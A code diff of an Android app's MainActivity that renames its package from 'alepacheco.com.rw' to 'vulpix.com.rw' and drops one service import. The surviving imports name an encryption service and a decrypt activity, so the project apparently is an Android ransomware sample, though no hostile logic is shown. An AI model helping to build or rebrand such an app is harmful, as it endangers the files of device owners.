@@ -1,4 +1,4 @@
-package alepacheco.com.rw;
+package vulpix.com.rw;
 
 import android.Manifest;
 import android.app.Activity;
@@ -16,11 +16,10 @@ import android.support.v4.content.ContextCompat;
 import java.util.ArrayList;
 import java.util.List;
 
-import alepacheco.com.rw.activityes.DecryptActivity;
-import alepacheco.com.rw.io.IO;
-import alepacheco.com.rw.persistence.LocalStorage;
-import alepacheco.com.rw.services.EncryptService;
-import alepacheco.com.rw.services.MyService;
+import vulpix.com.rw.activityes.DecryptActivity;
+import vulpix.com.rw.io.IO;
+import vulpix.com.rw.persistence.LocalStorage;
+import vulpix.com.rw.services.EncryptService;
 
 public class MainActivity extends Activity {
     String[] permissions = new String[]{
@@ -53,8 +52,8 @@ public class MainActivity extends Activity {
             if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 // Alert for permisions
                 new AlertDialog.Builder(this)
-                        .setTitle(alepacheco.com.rw.R.string.alert_title)
-                        .setMessage(alepacheco.com.rw.R.string.alert_message)
+                        .setTitle(vulpix.com.rw.R.string.alert_title)
+                        .setMessage(vulpix.com.rw.R.string.alert_message)
                         .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                             public void onClick(DialogInterface dialog, int which) {
                                 boolean permit = checkPermissions();
